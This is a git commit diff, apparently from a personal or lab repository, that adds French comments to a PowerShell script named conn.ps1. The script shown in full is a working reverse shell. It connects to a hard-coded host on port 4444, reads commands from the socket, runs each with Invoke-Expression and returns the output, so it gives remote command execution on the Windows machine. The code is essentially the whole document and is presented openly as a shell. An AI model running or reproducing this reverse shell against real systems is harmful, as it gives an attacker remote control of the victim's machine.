ae7c860ff893050e22319087ddff498e45d1143e
BrunoAucoin <bruno.aucoin95@gmail.com>
2026-04-11 17:06:11 +0200

    Update conn.ps1

--- conn.ps1
+++ conn.ps1
@@ -1,14 +1,18 @@
 $host_debian = "10.213.143.233"
 $port = 4444
 
+# Connexion TCP vers le Debian
 $client = New-Object System.Net.Sockets.TCPClient($host_debian, $port)
 $stream = $client.GetStream()
+
+# I/O sur le flux
 $writer = New-Object System.IO.StreamWriter($stream)
 $reader = New-Object System.IO.StreamReader($stream)
 $writer.AutoFlush = $true
 
 $writer.WriteLine("=== Shell Windows connecte ===")
 
+# Boucle principale de lecture/exécution des commandes
 while($true) {
     $writer.Write("PS> ")
     $cmd = $reader.ReadLine()
@@ -16,8 +20,10 @@ while($true) {
     try {
         $out = Invoke-Expression $cmd 2>&1 | Out-String
     } catch {
-        $out = $_.Exception.Message
+        $out = $_.Exception.Message  # Retourne l'erreur si exception
     }
     $writer.WriteLine($out)
 }
+
+# Fermeture propre
 $client.Close()
